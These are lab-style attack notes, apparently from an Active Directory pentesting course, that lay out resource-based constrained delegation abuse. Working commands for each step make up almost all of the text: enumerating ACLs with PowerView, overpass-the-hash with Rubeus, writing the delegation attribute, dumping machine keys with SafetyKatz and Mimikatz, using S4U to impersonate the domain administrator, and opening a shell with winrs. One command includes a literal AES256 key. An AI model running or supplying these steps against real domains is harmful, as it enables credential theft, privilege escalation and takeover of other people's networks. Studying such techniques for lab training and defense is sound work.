**Local admin privileges to the foothold/attacker machine are required due to the need of a machine hash**

Find that a compromised user has `Write` permissions over a machine (PowerView) 
```powershell
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```

We see that `ciadmin` has `GenericWrite` over `dcorp-mgmt`

Shell as user with `Write` permissions - `ciadmin` - OPtH
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:ciadmin /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

As `ciadmin`, add your foothold machine that you have local admin privileges to  the`PrincipalsAllowedToDelegateToAccount` (PowerView + AD Module)
```powershell
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student548$' -Verbose

$comps = 'dcorp-student548$'
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```

Confirm RBCD configuration
```powershell
Get-DomainRBCD
```

Obtain foothold/attacker machine machine hash (`dcorp-student548$`) - SID `S-1-5-18`
```powershell
Loader.exe -path .\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"

Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

Obtain ticket as machine account (`dcorp-student548$`) to access "second hop machine" (`dcorp-mgmt`)  as **ANY** user in the domain.
```powershell
Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```

```powershell
winrs -r:dcorp-mgmt cmd.exe
```